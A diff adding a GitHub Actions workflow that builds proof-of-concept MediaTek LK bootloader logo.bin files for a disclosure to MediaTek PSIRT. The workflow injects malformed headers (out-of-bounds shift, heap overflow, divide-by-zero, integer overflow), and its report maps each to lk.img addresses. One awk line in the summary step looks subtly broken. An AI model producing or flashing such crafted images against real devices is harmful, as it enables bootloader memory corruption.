@@ -1,0 +1,407 @@
+name: mtk-logo-poc
+
+on:
+  push:
+    branches: [ main, master ]
+    paths:
+      - 'input/logo.bin'
+      - 'scripts/mtk_logo_tool.py'
+      - '.github/workflows/mtk-logo-poc.yml'
+  pull_request:
+    branches: [ main, master ]
+  workflow_dispatch:
+    inputs:
+      pattern:
+        description: 'Pixel color for PoC images'
+        required: true
+        default: 'white'
+        type: choice
+        options: [white, black, red, green, blue]
+      combo_strategy:
+        description: 'How to distribute vuln vectors across images'
+        required: true
+        default: 'round_robin'
+        type: choice
+        options: [round_robin, all_same, safe_only]
+
+# ---- least-privilege token ----
+permissions:
+  contents: read
+
+env:
+  PYTHON_VERSION: '3.11'
+  INPUT_LOGO:   'input/logo.bin'
+  TOOL:         'scripts/mtk_logo_tool.py'
+  OUT_DIR:      'out'
+  REPORT_DIR:   'report'
+
+jobs:
+  build-poc:
+    name: Build PoC logo.bin(s)
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    steps:
+      # ---------------------------------------------------------
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+
+      # ---------------------------------------------------------
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: ${{ env.PYTHON_VERSION }}
+          cache: 'pip'
+
+      # ---------------------------------------------------------
+      - name: Verify inputs
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo "::group::input check"
+          if [ ! -f "${INPUT_LOGO}" ]; then
+            echo "::error file=${INPUT_LOGO}::input logo.bin not found in repo"
+            exit 1
+          fi
+          if [ ! -f "${TOOL}" ]; then
+            echo "::error file=${TOOL}::tool script not found"
+            exit 1
+          fi
+          ls -l "${INPUT_LOGO}" "${TOOL}"
+          sha256sum "${INPUT_LOGO}" | tee "${INPUT_LOGO}.sha256"
+          echo "::endgroup::"
+
+      # ---------------------------------------------------------
+      - name: Python syntax check
+        run: |
+          python -m py_compile "${TOOL}"
+          echo "[+] ${TOOL} compiles OK"
+
+      # ---------------------------------------------------------
+      - name: Prepare output dirs
+        run: |
+          mkdir -p "${OUT_DIR}" "${REPORT_DIR}"
+
+      # ---------------------------------------------------------
+      - name: Analyze original logo.bin
+        id: analyze
+        shell: bash
+        run: |
+          set -euo pipefail
+          python "${TOOL}" analyze "${INPUT_LOGO}" \
+            | tee "${REPORT_DIR}/01_analyze.txt"
+
+          # extract image count for later steps
+          count=$(grep -cE '^[[:space:]]*[0-9]+[[:space:]]+0x' \
+                  "${REPORT_DIR}/01_analyze.txt" || true)
+          echo "image_count=${count}" >> "$GITHUB_OUTPUT"
+          echo "[+] detected ${count} image(s) in logo.bin"
+          if [ "${count}" -eq 0 ]; then
+            echo "::error::could not parse any image headers"
+            exit 1
+          fi
+
+      # ---------------------------------------------------------
+      - name: Unpack original logo.bin -> PNG project
+        shell: bash
+        run: |
+          set -euo pipefail
+          python "${TOOL}" unpack "${INPUT_LOGO}" \
+            -o "${OUT_DIR}/project_original" \
+            | tee "${REPORT_DIR}/02_unpack.txt"
+          cp "${OUT_DIR}/project_original/manifest.json" \
+             "${REPORT_DIR}/manifest_original.json"
+          cp "${OUT_DIR}/project_original/.project" \
+             "${REPORT_DIR}/project.txt" || true
+
+      # ---------------------------------------------------------
+      # PoC variants: 1 file per vulnerability vector
+      # Each variant touches EVERY image at its native 1280x800 etc.
+      # ---------------------------------------------------------
+      - name: Generate PoC logo.bin - safe (pixel only)
+        if: ${{ inputs.combo_strategy == 'safe_only' || github.event_name != 'workflow_dispatch' }}
+        shell: bash
+        env:
+          PATTERN: ${{ inputs.pattern || 'white' }}
+        run: |
+          set -euo pipefail
+          count=${{ steps.analyze.outputs.image_count }}
+          tmp="${OUT_DIR}/_safe.bin"
+          cp "${INPUT_LOGO}" "${tmp}"
+          for i in $(seq 0 $((count-1))); do
+            python "${TOOL}" poc "${tmp}" -i "${i}" \
+              --vuln pattern --pattern "${PATTERN}" \
+              -o "${tmp}.next"
+            mv "${tmp}.next" "${tmp}"
+            echo "[+] safe: image #${i} replaced with ${PATTERN}"
+          done
+          mv "${tmp}" "${OUT_DIR}/logo_safe.bin"
+          ls -l "${OUT_DIR}/logo_safe.bin"
+
+      # ---------------------------------------------------------
+      - name: Generate PoC logo.bin - shift_neg (OOB render)
+        if: ${{ inputs.combo_strategy != 'safe_only' }}
+        shell: bash
+        env:
+          PATTERN: ${{ inputs.pattern || 'white' }}
+        run: |
+          set -euo pipefail
+          count=${{ steps.analyze.outputs.image_count }}
+          tmp="${OUT_DIR}/_shift.bin"
+          cp "${INPUT_LOGO}" "${tmp}"
+          for i in $(seq 0 $((count-1))); do
+            python "${TOOL}" poc "${tmp}" -i "${i}" \
+              --vuln shift_neg --pattern "${PATTERN}" \
+              -o "${tmp}.next"
+            mv "${tmp}.next" "${tmp}"
+            echo "[+] shift_neg: image #${i} shift_base->0"
+          done
+          mv "${tmp}" "${OUT_DIR}/logo_poc_shift_neg.bin"
+
+      # ---------------------------------------------------------
+      - name: Generate PoC logo.bin - alloc_short (heap overflow)
+        if: ${{ inputs.combo_strategy != 'safe_only' }}
+        shell: bash
+        env:
+          PATTERN: ${{ inputs.pattern || 'white' }}
+        run: |
+          set -euo pipefail
+          count=${{ steps.analyze.outputs.image_count }}
+          tmp="${OUT_DIR}/_alloc.bin"
+          cp "${INPUT_LOGO}" "${tmp}"
+          for i in $(seq 0 $((count-1))); do
+            python "${TOOL}" poc "${tmp}" -i "${i}" \
+              --vuln alloc_short --pattern "${PATTERN}" \
+              -o "${tmp}.next"
+            mv "${tmp}.next" "${tmp}"
+            echo "[+] alloc_short: image #${i} alloc_hint->1, aux=36*A"
+          done
+          mv "${tmp}" "${OUT_DIR}/logo_poc_alloc_short.bin"
+
+      # ---------------------------------------------------------
+      - name: Generate PoC logo.bin - div_zero
+        if: ${{ inputs.combo_strategy != 'safe_only' }}
+        shell: bash
+        env:
+          PATTERN: ${{ inputs.pattern || 'white' }}
+        run: |
+          set -euo pipefail
+          count=${{ steps.analyze.outputs.image_count }}
+          tmp="${OUT_DIR}/_div.bin"
+          cp "${INPUT_LOGO}" "${tmp}"
+          for i in $(seq 0 $((count-1))); do
+            python "${TOOL}" poc "${tmp}" -i "${i}" \
+              --vuln div_zero --pattern "${PATTERN}" \
+              -o "${tmp}.next"
+            mv "${tmp}.next" "${tmp}"
+            echo "[+] div_zero: image #${i} src_w/h->0"
+          done
+          mv "${tmp}" "${OUT_DIR}/logo_poc_div_zero.bin"
+
+      # ---------------------------------------------------------
+      - name: Generate PoC logo.bin - huge_w_h (int overflow)
+        if: ${{ inputs.combo_strategy != 'safe_only' }}
+        shell: bash
+        env:
+          PATTERN: ${{ inputs.pattern || 'white' }}
+        run: |
+          set -euo pipefail
+          count=${{ steps.analyze.outputs.image_count }}
+          tmp="${OUT_DIR}/_huge.bin"
+          cp "${INPUT_LOGO}" "${tmp}"
+          for i in $(seq 0 $((count-1))); do
+            python "${TOOL}" poc "${tmp}" -i "${i}" \
+              --vuln huge_w_h --pattern "${PATTERN}" \
+              -o "${tmp}.next"
+            mv "${tmp}.next" "${tmp}"
+            echo "[+] huge_w_h: image #${i} W/H->0xFFFFFFFF"
+          done
+          mv "${tmp}" "${OUT_DIR}/logo_poc_huge_w_h.bin"
+
+      # ---------------------------------------------------------
+      # "Ultimate repack": 全画像に異なる脆弱性を 1 つずつ割り当てる
+      # round-robin 配分で、LK の複数デコーダ経路を同時に刺激。
+      # ---------------------------------------------------------
+      - name: Generate PoC logo.bin - ULTIMATE (multi-vector combo)
+        if: ${{ inputs.combo_strategy == 'round_robin' || github.event_name != 'workflow_dispatch' }}
+        shell: bash
+        env:
+          PATTERN: ${{ inputs.pattern || 'white' }}
+        run: |
+          set -euo pipefail
+          count=${{ steps.analyze.outputs.image_count }}
+          vectors=(shift_neg alloc_short div_zero huge_w_h)
+          vlen=${#vectors[@]}
+
+          tmp="${OUT_DIR}/_ultimate.bin"
+          cp "${INPUT_LOGO}" "${tmp}"
+          : > "${REPORT_DIR}/ultimate_vector_map.txt"
+
+          for i in $(seq 0 $((count-1))); do
+            v="${vectors[$(( i % vlen ))]}"
+            python "${TOOL}" poc "${tmp}" -i "${i}" \
+              --vuln "${v}" --pattern "${PATTERN}" \
+              -o "${tmp}.next"
+            mv "${tmp}.next" "${tmp}"
+            echo "image #${i} -> ${v}" | tee -a "${REPORT_DIR}/ultimate_vector_map.txt"
+          done
+
+          mv "${tmp}" "${OUT_DIR}/logo_poc_ULTIMATE.bin"
+          ls -l "${OUT_DIR}/logo_poc_ULTIMATE.bin"
+
+      - name: Diff report vs original
+        shell: bash
+        run: |
+          set -euo pipefail
+          shopt -s nullglob
+          for f in "${OUT_DIR}"/logo_*.bin; do
+            name=$(basename "${f}" .bin)
+            echo "== ${name} ==" | tee -a "${REPORT_DIR}/03_diff.txt"
+            python "${TOOL}" diff "${INPUT_LOGO}" "${f}" \
+              | tee -a "${REPORT_DIR}/03_diff.txt" || true
+            echo >> "${REPORT_DIR}/03_diff.txt"
+          done
+
+      # ---------------------------------------------------------
+      - name: Extended analysis of each PoC (headers after injection)
+        shell: bash
+        run: |
+          set -euo pipefail
+          for f in "${OUT_DIR}"/logo_*.bin; do
+            name=$(basename "${f}" .bin)
+            {
+              echo "=== ${name} ==="
+              python "${TOOL}" analyze "${f}"
+              echo
+            } >> "${REPORT_DIR}/04_analyze_poc.txt"
+          done
+
+      # ---------------------------------------------------------
+      - name: Build MTK PSIRT report
+        shell: bash
+        env:
+          REPO:  ${{ github.repository }}
+          SHA:   ${{ github.sha }}
+          REF:   ${{ github.ref_name }}
+          PATTERN: ${{ inputs.pattern || 'white' }}
+          COMBO: ${{ inputs.combo_strategy || 'round_robin' }}
+        run: |
+          set -euo pipefail
+          input_size=$(stat -c%s "${INPUT_LOGO}")
+          input_sha=$(sha256sum "${INPUT_LOGO}" | awk '{print $1}')
+
+          {
+            echo "# MTK LK logo.bin PoC report"
+            echo
+            echo "- Repo: ${REPO}"
+            echo "- Commit: ${SHA}"
+            echo "- Branch: ${REF}"
+            echo "- Pattern: ${PATTERN}"
+            echo "- Combo strategy: ${COMBO}"
+            echo "- Input: \`${INPUT_LOGO}\` (${input_size} bytes)"
+            echo "- Input SHA256: \`${input_sha}\`"
+            echo
+            echo "## Vector map (ULTIMATE)"
+            cat "${REPORT_DIR}/ultimate_vector_map.txt" 2>/dev/null || echo "(n/a)"
+            echo
+            echo "## Header analysis of original"
+            echo '```'
+            cat "${REPORT_DIR}/01_analyze.txt" 2>/dev/null || true
+            echo '```'
+            echo
+            echo "## Diff vs original (each PoC)"
+            echo '```'
+            cat "${REPORT_DIR}/03_diff.txt" 2>/dev/null || true
+            echo '```'
+            echo
+            echo "## Static analysis linkage (lk.img offsets)"
+            cat <<'EOT'
+| Vector      | lk.img address | LK pseudo-code / reason                       |
+|-------------|----------------|-----------------------------------------------|
+| shift_neg   | sub_00015ce8   | `r3 << (hdr[0x27C] - 9)` negative shift → OOB |
+|             | @ 0x16274      |                                               |
+| alloc_short | sub_00016db8   | `alloc(hdr[0x28])` then `write 0x24 bytes`    |
+|             | @ 0x16fd2      | heap buffer overflow (CWE-787)                |
+| div_zero    | sub_00025bf0   | `div(src_width)` when src_width=0 → UDF       |
+|             | @ 0x16e46      |                                               |
+| huge_w_h    | sub_00016db8   | `offset + W*H` 32-bit wrap (CWE-190)          |
+|             | @ 0x16e46      |                                               |
+EOT
+            echo
+            echo "## WARNING"
+            echo "These artifacts are for RESPONSIBLE DISCLOSURE to MediaTek PSIRT only."
+            echo "Do NOT flash to devices you do not own."
+          } > "${REPORT_DIR}/00_REPORT.md"
+
+          echo "--- report preview ---"
+          head -60 "${REPORT_DIR}/00_REPORT.md"
+
+      # ---------------------------------------------------------
+      - name: Inventory
+        shell: bash
+        run: |
+          set -euo pipefail
+          {
+            echo "## Artifacts"
+            ls -l "${OUT_DIR}"
+            echo
+            echo "## SHA256"
+            sha256sum "${OUT_DIR}"/*.bin
+          } | tee "${REPORT_DIR}/05_inventory.txt"
+
+      # ---------------------------------------------------------
+      - name: Upload ULTIMATE artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: logo-poc-ULTIMATE
+          path: |
+            ${{ env.OUT_DIR }}/logo_poc_ULTIMATE.bin
+            ${{ env.REPORT_DIR }}/00_REPORT.md
+            ${{ env.REPORT_DIR }}/ultimate_vector_map.txt
+          retention-days: 30
+          if-no-files-found: error
+
+      # ---------------------------------------------------------
+      - name: Upload all variants (matrix artifact)
+        uses: actions/upload-artifact@v4
+        with:
+          name: logo-poc-all-variants
+          path: |
+            ${{ env.OUT_DIR }}/*.bin
+            ${{ env.REPORT_DIR }}/*
+          retention-days: 30
+          if-no-files-found: error
+
+      # ---------------------------------------------------------
+      - name: Upload unpacked project (for reviewer)
+        uses: actions/upload-artifact@v4
+        with:
+          name: logo-project-original
+          path: |
+            ${{ env.OUT_DIR }}/project_original/*
+          retention-days: 30
+          if-no-files-found: warn
+
+      # ---------------------------------------------------------
+      - name: Job summary
+        shell: bash
+        run: |
+          set -euo pipefail
+          {
+            echo "### MTK logo PoC build summary"
+            echo
+            echo "| file | size (bytes) | sha256 |"
+            echo "|---|---|---|"
+            for f in "${OUT_DIR}"/*.bin; do
+              s=$(stat -c%s "${f}")
+              h=$(sha256sum "${f}" | awk '{print substr($1,1,16)}…')
+              echo "| \`$(basename "${f}")\` | ${s} | ${h} |"
+            done
+            echo
+            echo "Vector map:"
+            echo '```'
+            cat "${REPORT_DIR}/ultimate_vector_map.txt" 2>/dev/null || true
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
